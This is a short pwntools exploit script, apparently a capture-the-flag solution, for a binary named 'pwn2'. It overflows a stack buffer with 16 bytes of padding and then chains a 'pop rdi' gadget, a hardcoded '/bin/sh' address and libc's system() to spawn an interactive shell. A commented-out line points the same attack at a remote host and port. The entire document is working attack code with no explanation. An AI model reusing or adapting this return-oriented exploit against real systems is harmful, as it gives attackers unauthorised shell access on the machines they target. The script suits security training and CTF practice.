from pwn import *
#p = remote('10.140.0.8', 11112)
p = process('./pwn2')
offset = 'a' * 16
target_addr = 0x04005f7
prr = p64(0x00000000004006d3)
binsh = p64(0x7ffff7b99d57)
system = p64(0x7ffff7a52390)

payload = offset + prr + binsh + system
p.sendline(payload)
p.interactive()
